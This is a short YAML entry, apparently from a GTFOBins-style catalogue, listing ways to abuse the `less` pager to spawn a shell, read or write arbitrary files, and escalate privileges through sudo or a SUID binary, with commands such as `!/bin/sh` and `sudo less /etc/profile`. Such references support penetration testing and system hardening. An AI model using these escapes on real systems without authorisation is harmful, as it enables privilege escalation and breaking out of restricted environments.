---
functions:
  shell:
    - code: |
        less /etc/profile
        !/bin/sh
    - code: |
        VISUAL="/bin/sh -c '/bin/sh'" less /etc/profile
        v
    - code: |
        less /etc/profile
        v:shell
  file-read:
    - code: less file_to_read
    - description: This is useful when `less` is used as a pager by another binary to read a different file.
      code: |
        less /etc/profile
        :e file_to_read
  file-write:
    - code: |
        echo DATA | less
        sfile_to_write
        q
    - description: This invokes the default editor to edit the file. The file must exist.
      code: |
        less file_to_write
        v
  sudo:
    - code: |
        sudo less /etc/profile
        !/bin/sh
  suid:
    - code: ./less file_to_read
---
